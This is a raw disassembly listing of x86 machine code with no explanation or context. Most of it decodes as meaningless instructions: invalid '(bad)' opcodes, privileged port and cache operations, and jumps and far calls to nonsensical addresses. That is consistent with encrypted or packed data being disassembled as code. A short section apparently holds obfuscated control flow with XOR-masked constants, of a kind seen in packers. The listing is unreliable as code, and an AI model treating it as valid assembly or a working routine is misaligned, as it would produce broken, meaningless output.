  405a32:	mov    BYTE PTR [edi+edx*4+0x2dc5531],dh
  405a39:	repnz addr16 pop ss
  405a3c:	aas    
  405a3d:	mov    al,0x5a
  405a3f:	cs mov cl,0x46
  405a42:	sub    eax,0xa7680897
  405a47:	dec    ebx
  405a48:	rcl    DWORD PTR [edi],0x21
  405a4b:	out    0x7,eax
  405a4d:	clc    
  405a4e:	sbb    bh,ah
  405a50:	cld    
  405a51:	sbb    BYTE PTR [esi],dh
  405a53:	sbb    al,0x46
  405a55:	inc    eax
  405a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a57:	adc    dl,bh
  405a59:	fdecstp 
  405a5b:	ds stos DWORD PTR es:[edi],eax
  405a5d:	or     DWORD PTR [ecx-0x512ddd17],ebx
  405a63:	icebp  
  405a64:	sub    eax,0xd06c4a23
  405a69:	imul   ebp,DWORD PTR [edi+edi*8-0x3c],0xe96a9a00
  405a71:	mov    esi,0x80b22534
  405a76:	xchg   ebx,eax
  405a77:	pop    ebx
  405a78:	cmp    bh,BYTE PTR [ebx-0x46a9ec37]
  405a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a7f:	dec    edx
  405a80:	mov    ds:0x80b679fd,eax
  405a85:	inc    edx
  405a86:	mov    al,ds:0xeeb35760
  405a8b:	xchg   BYTE PTR [ecx-0x31f5612f],cl
  405a91:	mov    cl,0xa1
  405a93:	or     al,0x92
  405a95:	mov    WORD PTR [edx-0x30],cs
  405a98:	dec    esi
  405a99:	aad    0xde
  405a9b:	sub    al,0x56
  405a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a9e:	mov    dh,0x6d
  405aa0:	(bad)  
  405aa1:	iret   
  405aa2:	ret    0xb0e1
  405aa5:	lods   al,BYTE PTR ds:[esi]
  405aa6:	int    0xd8
  405aa8:	sbb    eax,0xfd78a75
  405aad:	int3   
  405aae:	ficom  WORD PTR [ecx-0x7f]
  405ab1:	dec    edx
  405ab2:	pushf  
  405ab3:	iret   
  405ab4:	leave  
  405ab5:	adc    eax,0xe35db511
  405aba:	add    al,0x48
  405abc:	sahf   
  405abd:	mov    bh,0x43
  405abf:	out    0x9d,eax
  405ac1:	dec    ebp
  405ac2:	pop    ecx
  405ac3:	jge    0x405b33
  405ac5:	mov    ah,0x20
  405ac7:	add    DWORD PTR [ebx+0x7faf866f],esp
  405acd:	test   eax,0x8f3add92
  405ad2:	xchg   ebp,eax
  405ad3:	mov    edx,0x12cd5485
  405ad8:	or     al,0x17
  405ada:	inc    edi
  405adb:	and    al,0x85
  405add:	dec    esp
  405ade:	push   esp
  405adf:	repnz loopne 0x405b0b
  405ae2:	or     al,0xb3
  405ae4:	pop    esp
  405ae5:	mov    ds:0xe1e3fd16,eax
  405aea:	inc    edi
  405aeb:	imul   ecx,DWORD PTR [ebx],0xfffffff5
  405aee:	loop   0x405ac9
  405af0:	xchg   ebx,eax
  405af1:	xchg   BYTE PTR [ebp+0x6f],dh
  405af4:	lods   al,BYTE PTR ds:[esi]
  405af5:	rcl    DWORD PTR [ebp-0x2e],cl
  405af8:	inc    esp
  405af9:	invd   
  405afb:	je     0x405b28
  405afd:	or     DWORD PTR [ecx-0x1509249a],esp
  405b03:	lahf   
  405b04:	sub    DWORD PTR [eax-0x6b012e80],edx
  405b0a:	(bad)  
  405b0b:	adc    dh,dl
  405b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b0e:	cld    
  405b0f:	test   eax,0x513c1aef
  405b14:	(bad)  
  405b15:	out    dx,al
  405b16:	inc    esp
  405b17:	outs   dx,BYTE PTR ds:[esi]
  405b18:	jae    0x405b94
  405b1a:	aaa    
  405b1b:	popf   
  405b1c:	or     al,0xa5
  405b1e:	ins    DWORD PTR es:[edi],dx
  405b1f:	mov    dl,0x26
  405b21:	addr16 push 0xffffffb7
  405b24:	pop    ds
  405b25:	jo     0x405b04
  405b27:	sub    bh,cl
  405b29:	test   eax,0x14270e4c
  405b2e:	sub    al,0x4
  405b30:	push   0xffffffb4
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xd6d0495c
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405bac
  405be0:	mov    ebp,0x7254ba6c
  405be5:	push   edx
  405be6:	sub    al,0x86
  405be8:	jle    0x405c5f
  405bea:	mov    eax,esp
  405bec:	or     ch,ah
  405bee:	shl    edx,1
  405bf0:	xor    bl,ah
  405bf2:	and    DWORD PTR [edi+0x45912e1],esp
  405bf8:	cli    
  405bf9:	shl    DWORD PTR [edi-0x4a4a85dd],1
  405bff:	rcl    edi,cl
  405c01:	data16 aaa 
  405c03:	or     cl,BYTE PTR [ebx+ebp*1-0x2e]
  405c07:	leave  
  405c08:	cmp    edi,edx
  405c0a:	jl     0x405be7
  405c0c:	imul   esp,edx,0x7c
  405c0f:	icebp  
  405c10:	mov    esi,0x4a5025fb
  405c15:	pop    ebx
  405c16:	stos   DWORD PTR es:[edi],eax
  405c17:	dec    edi
  405c18:	loop   0x405bc5
  405c1a:	and    bh,BYTE PTR [eax+0x7e]
  405c1d:	jmp    0x290e:0x41426052
  405c24:	add    eax,0x5127c485
  405c29:	sbb    BYTE PTR [ebx+0x4a],al
  405c2c:	repz dec edi
  405c2e:	dec    ebx
  405c2f:	jmp    0x405c2f
  405c31:	mov    dl,0xb5
  405c33:	jmp    0x405bdc
  405c35:	(bad)  
  405c36:	in     eax,dx
  405c37:	fild   WORD PTR ds:0x1fe195fe
  405c3d:	or     DWORD PTR [ecx-0x35],ebp
  405c40:	outs   dx,DWORD PTR ds:[esi]
  405c41:	and    bl,BYTE PTR [ebx+0x3]
  405c44:	push   esi
  405c45:	test   BYTE PTR [edx+edi*2-0xc1dd925],cl
  405c4c:	icebp  
  405c4d:	sbb    ebx,DWORD PTR [eax]
  405c4f:	aad    0xe3
  405c51:	sar    DWORD PTR [edx+0x36e20ea1],0x3c
  405c58:	inc    edx
  405c59:	(bad)
  405c5c:	fdivr  QWORD PTR [edi]
  405c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5f:	dec    edx
  405c60:	sbb    esi,DWORD PTR [ebx-0x59d9bf50]
  405c66:	mov    edx,0xc3420a50
  405c6b:	jl     0x405c81
  405c6d:	mov    ah,0x65
  405c6f:	lea    eax,[esi-0x435ee6a6]
  405c75:	out    dx,eax
  405c76:	ret    
  405c77:	xchg   ebp,eax
  405c78:	mov    dh,0xff
  405c7a:	aam    0xd
  405c7c:	lods   al,BYTE PTR ds:[esi]
  405c7d:	aam    0x41
  405c7f:	xchg   edi,eax
  405c80:	jp     0x405c6e
  405c82:	xor    BYTE PTR [esi+0x6e],cl
  405c85:	push   ss
  405c86:	call   0xe173:0xd0eee10c
  405c8d:	cs sub bh,cl
  405c90:	xchg   ebp,eax
  405c91:	ret    
  405c92:	mov    gs,eax
  405c94:	(bad)  
  405c95:	popf   
  405c96:	leave  
  405c97:	and    DWORD PTR [eax],esp
  405c99:	pop    es
  405c9a:	cmp    al,0xdb
  405c9c:	and    cl,0x45
  405c9f:	es push 0x968d416f
  405ca5:	dec    esp
  405ca6:	mov    cl,0x35
  405ca8:	imul   eax,edx,0x35
  405cab:	and    eax,0x1d45b37e
  405cb0:	and    al,0x43
  405cb2:	cld    
  405cb3:	xchg   DWORD PTR [edx],edi
  405cb5:	cli    
  405cb6:	test   DWORD PTR [esp+esi*2+0x5a],ebx
  405cba:	out    0x79,eax
  405cbc:	jne    0x405cb9
  405cbe:	mov    bl,0x6d
  405cc0:	xchg   esp,eax
  405cc1:	adc    al,0xf
  405cc3:	ins    BYTE PTR es:[edi],dx
  405cc4:	or     eax,0xc93cd9de
  405cc9:	div    DWORD PTR [ebp+ebx*8+0x53]
  405ccd:	shr    BYTE PTR [edx],0xd8
  405cd0:	into   
  405cd1:	dec    ecx
  405cd2:	jmp    0x424023ce
  405cd7:	retf   
  405cd8:	lods   eax,DWORD PTR ds:[esi]
  405cd9:	mov    ecx,0xf19924a8
  405cde:	clc    
  405cdf:	pop    ebp
  405ce0:	jle    0x405cca
  405ce2:	ficomp WORD PTR [eax]
  405ce4:	add    eax,0xdb6a25d6
  405ce9:	xor    eax,0xcf77575f
  405cee:	and    BYTE PTR [ebx],dh
  405cf0:	xor    dl,bl
  405cf2:	pop    ebx
  405cf3:	pushf  
  405cf4:	jle    0x405cf8
  405cf6:	ror    dl,1
  405cf8:	mov    al,0x89
  405cfa:	mov    bh,0xe4
  405cfc:	arpl   WORD PTR [eax-0x1291baeb],cx
  405d02:	sbb    BYTE PTR [ebx-0x5c],dh
  405d05:	pop    edx
  405d06:	(bad)
  405d0a:	pop    ebx
  405d0b:	call   0xbe817cb2
  405d10:	jne    0x405d23
  405d12:	add    ebx,esp
  405d14:	adc    al,BYTE PTR [ecx+eiz*8-0x31]
  405d18:	std    
  405d19:	xchg   esp,eax
  405d1a:	mov    DWORD PTR [edi+edi*1+0x350bd38f],edx
  405d21:	xchg   ebx,eax
  405d22:	add    al,0xf7
  405d24:	pop    ecx
  405d25:	lods   al,BYTE PTR ds:[esi]
  405d26:	test   BYTE PTR [esi],dh
  405d28:	rcr    esp,0x89
  405d2b:	pop    ds
  405d2c:	mov    WORD PTR [ebx+edx*2-0x2d220e9d],ds
  405d33:	push   ss
  405d34:	dec    ebx
  405d35:	sahf   
  405d36:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  405d38:	adc    DWORD PTR [edi-0x6b],esi
  405d3b:	adc    dh,BYTE PTR [eax]
  405d3d:	retf   
  405d3e:	(bad)  
  405d3f:	outs   dx,DWORD PTR ds:[esi]
  405d40:	aas    
  405d41:	mov    bl,0xdf
  405d43:	int3   
  405d44:	ins    BYTE PTR es:[edi],dx
  405d45:	aad    0x8e
  405d47:	mov    edx,DWORD PTR [ecx]
  405d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d4a:	cdq    
  405d4b:	mov    ds:0xd54ffd21,al
  405d50:	repnz pop eax
  405d52:	inc    ebp
  405d53:	fcomp  QWORD PTR [edx]
  405d55:	in     eax,0xa
  405d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d58:	mov    dl,0x5d
  405d5a:	xchg   ebx,eax
  405d5b:	add    DWORD PTR [ebp+0x22c3cc07],ecx
  405d61:	jmp    0x405d8e
  405d63:	push   ds
  405d64:	pusha  
  405d65:	outs   dx,BYTE PTR ds:[esi]
  405d66:	fisttp QWORD PTR [edx]
  405d68:	or     al,0x6d
  405d6a:	jg     0x405de6
  405d6c:	mov    esp,0x1ff4eff7
  405d71:	lock int3 
  405d73:	jno    0x405d96
  405d75:	in     al,dx
  405d76:	push   esi
  405d77:	jne    0x405d09
  405d79:	outs   dx,DWORD PTR ds:[esi]
  405d7a:	dec    edi
  405d7b:	mov    ah,0x8d
  405d7d:	test   BYTE PTR [esi],bl
  405d7f:	retf   
  405d80:	mov    DWORD PTR [esi],ebx
  405d82:	adc    DWORD PTR [ebx-0x4a572c37],0xffffffd6
  405d89:	sub    BYTE PTR [esi-0xaab3ac2],ah
  405d8f:	or     bh,BYTE PTR [esi+0x11]
  405d92:	rcl    BYTE PTR [edi-0x49],1
  405d95:	or     DWORD PTR [edx+0x42],0xffffffc1
  405d99:	push   0x27
  405d9b:	aad    0x57
  405d9d:	dec    edx
  405d9e:	pop    esi
  405d9f:	(bad)  
  405da0:	clc    
  405da1:	fadd   QWORD PTR [edx]
  405da3:	stc    
  405da4:	leave  
  405da5:	mov    dl,0x89
  405da7:	aad    0x0
  405da9:	or     eax,0x8c5a385e
  405dae:	and    DWORD PTR [eax],0xcfe989d1
  405db4:	dec    ebp
  405db5:	daa    
  405db6:	in     al,0x97
  405db8:	int    0x4f
  405dba:	jo     0x405dfc
  405dbc:	jb     0x405dc5
  405dbe:	ficomp DWORD PTR [edi-0x2f]
  405dc1:	fwait
  405dc2:	popa   
  405dc3:	test   al,0x66
  405dc5:	and    DWORD PTR [edx+0x7a25eba5],edi
  405dcb:	lea    edx,[esi]
  405dcd:	out    dx,al
  405dce:	mov    edi,0x1e711aaa
  405dd3:	pop    ebx
  405dd4:	(bad)
  405dd8:	mov    dl,0x6
  405dda:	mov    ?,ecx
  405ddc:	enter  0x129e,0x9a
  405de0:	inc    esi
  405de1:	fcmovne st,st(1)
  405de3:	call   0x29d4:0x18026fcb
  405dea:	push   esi
  405deb:	mov    bl,0x71
  405ded:	inc    ecx
  405dee:	aad    0x83
  405df0:	mov    dl,0xa
  405df2:	icebp  
  405df3:	sbb    dl,dl
  405df5:	ds pop eax
  405df7:	loop   0x405e5c
  405df9:	ror    DWORD PTR [edi+0x27d8f1c2],0xbd
  405e00:	xor    al,0x1
  405e02:	jo     0x405db4
  405e04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e05:	call   0xa5da:0xf6db96c3
  405e0c:	mov    bh,0xfb
  405e0e:	dec    ecx
  405e0f:	mov    DWORD PTR [esi-0x49],esp
  405e12:	call   DWORD PTR [eax+0x6e]
  405e15:	xchg   BYTE PTR [ecx+0x6fd8e370],ah
  405e1b:	dec    ecx
  405e1c:	repz dec edx
  405e1e:	fldenv [bp+di-0x2423]
  405e23:	test   cl,cl
  405e25:	std    
  405e26:	cmp    esp,eax
  405e28:	xor    eax,0x165fcab5
  405e2d:	pop    ebx
  405e2e:	jecxz  0x405e77
  405e30:	cdq    
  405e31:	retf   
  405e32:	imul   edx,DWORD PTR [edi],0x596c1c49
  405e38:	sahf   
  405e39:	mov    ecx,0x8ae6133e
  405e3e:	push   cs
  405e3f:	aam    0x83
  405e41:	cs jne 0x405de7
  405e44:	mov    esp,0x9ec71c77
  405e49:	add    edi,esi
  405e4b:	retf   0x1196
  405e4e:	fst    DWORD PTR [ebp+0x6d]
  405e51:	pusha  
  405e52:	das    
  405e53:	pop    ebp
  405e54:	xor    DWORD PTR [ecx],edx
  405e56:	adc    eax,0xc6c496b7
  405e5b:	ror    BYTE PTR [edx+0x49],cl
  405e5e:	int    0x9a
  405e60:	jmp    0x405e68
  405e62:	sub    eax,0xbd78c1eb
  405e67:	scas   al,BYTE PTR es:[edi]
  405e68:	xor    eax,0x899874c3
  405e6d:	std    
  405e6e:	or     DWORD PTR [ebp+eax*2-0x21304d5],esp
  405e75:	in     al,dx
  405e76:	mov    BYTE PTR [eax+0x2968b742],ah
  405e7c:	pusha  
  405e7d:	pusha  
  405e7e:	xor    al,0xf7
  405e80:	mov    dl,0x8e
  405e82:	pop    eax
  405e83:	lods   eax,DWORD PTR ds:[esi]
  405e84:	pop    edi
  405e85:	dec    edx
  405e86:	pop    ss
  405e87:	dec    edi
  405e88:	lods   eax,DWORD PTR ds:[esi]
  405e89:	sub    cl,BYTE PTR [edi-0x11]
  405e8c:	adc    ebx,0xb0fca31d
  405e92:	push   esp
  405e93:	push   edx
  405e94:	mov    ds:0x931ee544,eax
  405e99:	cdq    
  405e9a:	cs sti 
  405e9c:	mov    ah,0x5b
  405e9e:	inc    ebp
  405e9f:	push   ss
  405ea0:	nop
  405ea1:	fistp  WORD PTR [edx+ebp*8-0x5e]
  405ea5:	pop    ecx
  405ea6:	inc    ebp
  405ea7:	cmp    ecx,DWORD PTR [ecx+0x79e79b99]
  405ead:	sbb    al,0x6a
  405eaf:	xchg   BYTE PTR [edi],bh
  405eb1:	cmp    dh,BYTE PTR [esi+0x212f79f7]
  405eb7:	pop    esp
  405eb8:	inc    edx
  405eb9:	push   cs
  405eba:	sub    eax,DWORD PTR [eax-0x19317b82]
  405ec0:	sar    edi,cl
  405ec2:	dec    eax
  405ec3:	hlt    
  405ec4:	push   ebx
  405ec5:	mov    dh,0xcc
  405ec7:	test   al,0xa2
  405ec9:	add    al,0x4f
  405ecb:	ret    0x2f08
  405ece:	push   0x8b6e44c7
  405ed3:	push   ds
  405ed4:	mov    eax,ds:0xf51fbbce
  405ed9:	lds    esp,FWORD PTR [ecx+0x60]
  405edc:	sbb    eax,0x42fbc911
  405ee1:	enter  0xff30,0xc
  405ee5:	pop    esp
  405ee6:	div    DWORD PTR [edi-0x2507f69b]
  405eec:	idiv   BYTE PTR [ebx+ecx*2]
  405eef:	(bad)  
  405ef0:	pop    edx
  405ef2:	cmp    BYTE PTR [ebx],0xd2
  405ef5:	js     0x405f5e
  405ef7:	vsubpd ymm6,ymm5,YMMWORD PTR [esi-0x7e]
  405efc:	and    edx,DWORD PTR [eax+eax*2]
  405eff:	enter  0x2ce0,0x67
  405f03:	cmp    BYTE PTR [eax],0x95
  405f06:	or     BYTE PTR [esi],bh
  405f08:	mov    dl,BYTE PTR [esi]
  405f0a:	js     0x405ec3
  405f0c:	jno    0x405ef2
  405f0e:	xor    eax,0xf1339715
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [eax-0x5937f67d],?
  405f2b:	xor    BYTE PTR [esi+0x7e],bh
  405f2e:	sub    al,0x7d
  405f30:	jle    0x405fb0
  405f32:	ror    BYTE PTR [ecx-0x2c],0x86
  405f36:	fld    QWORD PTR [ecx-0x6]
  405f39:	inc    ebx
  405f3a:	test   eax,0x637503fb
  405f3f:	out    0xaf,eax
  405f41:	sar    BYTE PTR [edi+0x34],0xaa
  405f45:	jb     0x405fb4
  405f47:	imul   edi,DWORD PTR [edi-0x8a7a48],0x37fa45d6
  405f51:	rol    BYTE PTR [ecx-0x59270df1],cl
  405f57:	mov    esi,0x169384ba
  405f5c:	loope  0x405f4f
  405f5e:	addr16 gs loop 0x405fd4
  405f62:	xor    ch,BYTE PTR [ebp-0x5c]
  405f65:	sbb    al,0xd8
  405f67:	cmp    al,0xcd
  405f69:	leave  
  405f6a:	cld    
  405f6b:	cmp    BYTE PTR [ecx+0x3e58b8eb],bl
  405f71:	cmp    al,0x4
  405f73:	fucomi st,st(5)
  405f75:	mov    BYTE PTR [eax],dh
  405f77:	dec    edi
  405f78:	ss mov ch,0x9b
  405f7b:	push   ebx
  405f7c:	sbb    bh,ah
  405f7e:	jne    0x405fbd
  405f80:	jle    0x405f08
  405f82:	arpl   WORD PTR [esi-0x61240440],bp
  405f88:	retfw  
  405f8a:	fdecstp 
  405f8c:	mov    esp,0xdda70809
  405f91:	push   ss
  405f92:	mov    ds:0xbfb90bb5,eax
  405f97:	addr16 dec ebx
  405f99:	or     DWORD PTR [edx-0x46],ebp
  405f9c:	retf   
  405f9d:	imul   eax,DWORD PTR [ecx+0x608f456c],0x68
  405fa4:	ja     0x405f5b
  405fa6:	xlat   BYTE PTR ds:[ebx]
  405fa7:	add    BYTE PTR [ebp*2+0x34b07a03],bh
  405fae:	out    0x27,al
  405fb0:	scas   al,BYTE PTR es:[edi]
  405fb1:	push   ebx
  405fb2:	jecxz  0x405f50
  405fb4:	mov    edx,0x54ea6708
  405fb9:	bound  ebp,QWORD PTR [eax-0x15]
  405fbc:	shr    BYTE PTR [ebp+0x5d],1
  405fbf:	cli    
  405fc0:	dec    ebx
  405fc1:	dec    esp
  405fc2:	loope  0x405f7d
  405fc4:	scas   al,BYTE PTR es:[edi]
  405fc5:	pusha  
  405fc6:	jne    0x405f8a
  405fc8:	adc    esi,DWORD PTR [ecx+0x5c0d2a53]
  405fce:	js     0x40600a
  405fd0:	pushf  
  405fd1:	scas   eax,DWORD PTR es:[edi]
  405fd2:	adc    DWORD PTR ds:0x3d8b78aa,esi
  405fd8:	mov    esi,0x1d215a29
  405fdd:	imul   edi,DWORD PTR [esi+0x7df6fca],0x711451c0
  405fe7:	pop    ebx
  405fe8:	sub    dl,BYTE PTR [edx+0x406ab72b]
  405fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fef:	jae    0x405fcf
  405ff1:	iret   
  405ff2:	pop    es
  405ff3:	jecxz  0x405fc6
  405ff5:	aam    0xa5
  405ff7:	daa    
  405ff8:	mov    ebx,0x4839c6d8
  405ffd:	cmp    DWORD PTR [esi-0xc],ecx
  406000:	loop   0x406068
  406002:	js     0x405f88
  406004:	pop    edi
  406005:	inc    eax
  406006:	(bad)  
  406007:	jbe    0x40604f
  406009:	sbb    ecx,DWORD PTR [ebx-0x62bfb1c5]
  40600f:	outs   dx,DWORD PTR ds:[esi]
  406010:	dec    ecx
  406011:	pop    ebx
  406012:	lods   eax,DWORD PTR ds:[esi]
  406013:	test   DWORD PTR [edi],eax
  406015:	jne    0x406070
  406017:	and    BYTE PTR [edx+eiz*4],al
  40601a:	addr16 jmp 0x40608a
  40601d:	cmp    esi,DWORD PTR [ecx+ecx*2]
  406020:	das    
  406021:	adc    BYTE PTR [ecx],ch
  406023:	retf   0x5966
  406026:	cld    
  406027:	jl     0x405fcd
  406029:	push   esi
  40602a:	xchg   edi,eax
  40602b:	fistp  WORD PTR [edx]
  40602d:	push   ecx
  40602e:	call   0x5a649418
  406033:	jne    0x406084
  406035:	mov    ebp,0x816d8ef6
  40603a:	add    DWORD PTR [ecx+0x2b96c139],ebp
  406040:	fsub   DWORD PTR [edi+0x27]
  406043:	mov    cl,0xa6
  406045:	sbb    eax,0xf6972a53
  40604a:	daa    
  40604b:	jae    0x4060bd
  40604d:	loop   0x406068
  40604f:	inc    edx
  406050:	push   esi
  406051:	shl    al,1
  406053:	in     eax,dx
  406054:	mov    bl,0x17
  406056:	jge    0x406050
  406058:	mov    edx,0xddb45af9
  40605d:	xchg   edx,eax
  40605e:	das    
  40605f:	sbb    cl,cl
  406061:	xor    bh,BYTE PTR [ebp-0x4366b3f3]
  406067:	cmp    eax,0x4bb94bc3
  40606c:	adc    BYTE PTR [ebx],al
  40606e:	bound  eax,QWORD PTR [edi+0x2b477103]
  406074:	jnp    0x406064
  406076:	cdq    
  406077:	pop    ecx
  406078:	pop    esi
  406079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40607a:	fidiv  WORD PTR [ecx-0x73]
  40607d:	pusha  
  40607e:	je     0x406044
  406080:	inc    edx
  406081:	popf   
  406082:	ret    
  406083:	test   BYTE PTR [eax+0x3c],0xcb
  406087:	mov    edi,0xf2543b8a
  40608c:	scas   eax,DWORD PTR es:[edi]
  40608d:	arpl   ax,dx
  40608f:	adc    al,0x2a
  406091:	jmp    0x7f2254a5
  406096:	or     al,0x77
  406098:	fimul  WORD PTR [edx+0x4fed5ad6]
  40609e:	cmp    esi,DWORD PTR [edi]
  4060a0:	and    eax,0xfb230d34
  4060a5:	or     DWORD PTR [edx],ebx
  4060a7:	adc    al,0xb7
  4060a9:	sub    eax,0xb70aff4c
  4060ae:	loop   0x406036
  4060b0:	mov    dl,0x70
  4060b2:	ficom  DWORD PTR [ebp-0x51]
  4060b5:	out    dx,eax
  4060b6:	fimul  DWORD PTR [eax+0x5a]
  4060b9:	(bad)  
  4060ba:	xor    eax,0x24c97b2d
  4060bf:	daa    
  4060c0:	adc    DWORD PTR [edx+0x1a],0x61
  4060c4:	sbb    edi,edi
  4060c6:	dec    esi
  4060c7:	fcmovu st,st(2)
  4060c9:	xchg   esi,eax
  4060ca:	cld    
  4060cb:	mov    DWORD PTR [eax+0x190162fb],edi
  4060d1:	into   
  4060d2:	mov    eax,DWORD PTR [ebp+0x44]
  4060d5:	sub    eax,0x1a541dc4
  4060da:	cli    
  4060db:	loope  0x40611e
  4060dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060de:	pop    ss
  4060df:	aam    0xfa
  4060e1:	mov    ch,0x40
  4060e3:	retf   
  4060e4:	xchg   esp,eax
  4060e5:	xchg   edi,eax
  4060e6:	pop    ebx
  4060e7:	jnp    0x4060d8
  4060e9:	out    dx,eax
  4060ea:	pop    eax
  4060eb:	mov    edi,0x9c09d9
  4060f0:	repnz xlat BYTE PTR ds:[ebx]
  4060f2:	xor    ebp,ebp
  4060f4:	out    0xc9,eax
  4060f6:	(bad)  
  4060f7:	pop    ds
  4060f8:	lds    ebp,FWORD PTR [edi]
  4060fa:	fwait
  4060fb:	pop    edx
  4060fc:	adc    esi,DWORD PTR [ecx-0x4d]
  4060ff:	or     dh,ah
  406101:	rcl    DWORD PTR [eax-0x10],0x4b
  406105:	je     0x406159
  406107:	call   0xf80293c5
  40610c:	imul   ebp,DWORD PTR [ebp+0x52769da5],0xedeff90e
  406116:	mov    dh,0x92
  406118:	pop    es
  406119:	out    dx,al
  40611a:	adc    esi,DWORD PTR [edx+0x6f]
  40611d:	jecxz  0x406189
  40611f:	cmp    eax,0x8a749b60
  406124:	stos   BYTE PTR es:[edi],al
  406125:	ja     0x4060d7
  406127:	dec    edi
  406128:	or     eax,0x92caab15
  40612d:	xchg   ebx,eax
  40612e:	enter  0x3a17,0xe9
  406132:	push   esp
  406133:	sbb    al,0x19
  406135:	cmp    al,0xbf
  406137:	and    DWORD PTR [eax],esi
  406139:	adc    al,0x82
  40613b:	pop    ds
  40613c:	leave  
  40613d:	inc    ebx
  40613e:	cmp    eax,0x9ef94a75
  406143:	imul   ebp,DWORD PTR [edx],0x30
  406146:	icebp  
  406147:	mov    edx,0xb936bc82
  40614c:	pusha  
  40614d:	xchg   bp,ax
  40614f:	loope  0x40612b
  406151:	arpl   WORD PTR [esi],cx
  406153:	loop   0x4060ff
  406155:	cmp    edx,ebp
  406157:	jne    0x4060f1
  406159:	loope  0x4061da
  40615b:	nop
  40615c:	xchg   DWORD PTR [ecx+edi*1+0x1a9136b3],ebx
  406163:	add    al,0x7d
  406165:	call   0x5d3aee2f
  40616a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616b:	push   ds
  40616c:	cmp    DWORD PTR [edx+0x71],esi
  40616f:	add    DWORD PTR [edx+edx*4-0x3040a4b5],ebp
  406176:	(bad)  
  406177:	fldenv [eax]
  406179:	neg    DWORD PTR [edx]
  40617b:	ins    BYTE PTR es:[edi],dx
  40617c:	hlt    
  40617d:	dec    esp
  40617e:	sub    DWORD PTR [edi],edx
  406180:	inc    esi
  406181:	and    eax,0xaee353db
  406186:	cmp    BYTE PTR [edx+0x35],al
  406189:	lods   al,BYTE PTR ds:[esi]
  40618a:	add    al,0x26
  40618c:	adc    eax,DWORD PTR [esi-0x60143878]
  406192:	scas   al,BYTE PTR es:[edi]
  406193:	jle    0x40620e
  406195:	stc    
  406196:	(bad)  
  406198:	ficom  DWORD PTR [ebp+0xea4dba9]
  40619e:	test   eax,0xaa3cfa97
  4061a3:	xchg   esi,eax
  4061a4:	push   edi
  4061a5:	mov    ebp,DWORD PTR cs:[edx-0x67138257]
  4061ac:	and    eax,0xaa45049a
  4061b1:	add    al,BYTE PTR [esi+0x9]
  4061b4:	lahf   
  4061b5:	icebp  
  4061b6:	pop    ds
  4061b7:	push   0x9e446904
  4061bc:	fisubr DWORD PTR [ebp+edi*1-0x32ea999]
  4061c3:	test   BYTE PTR [eax+ecx*1],ch
  4061c6:	cdq    
  4061c7:	dec    esp
  4061c8:	popf   
  4061c9:	out    dx,al
  4061ca:	test   BYTE PTR [ebp-0x4f137de5],0x33
  4061d1:	xor    al,0x4
  4061d3:	mov    edx,0x7ac36fc9
  4061d8:	lods   al,BYTE PTR ds:[esi]
  4061d9:	lock lock outs dx,BYTE PTR ds:[esi]
  4061dc:	fistp  QWORD PTR [eax]
  4061de:	xor    al,0xe2
  4061e0:	push   ss
  4061e1:	or     DWORD PTR [ebx-0x7f],0xffffffde
  4061e5:	inc    ebx
  4061e6:	test   DWORD PTR ds:0xf4d6f7f9,edi
  4061ec:	push   es
  4061ed:	test   al,0x1
  4061ef:	adc    bh,BYTE PTR [esi-0x7b728362]
  4061f5:	mov    esp,0x7bc674f0
  4061fa:	and    BYTE PTR [edi],bh
  4061fc:	hlt    
  4061fd:	mov    ds:0xb11b9a7c,al
  406202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406203:	sti    
  406204:	repnz xchg esp,eax
  406206:	data16 or bl,bh
  406209:	mov    ebp,0xf3fad9d9
  40620e:	inc    ebx
  40620f:	mov    eax,0xa1ebc560
  406214:	jge    0x40627e
  406216:	and    eax,0x7c988783
  40621b:	mov    ds:0x4ca763c1,eax
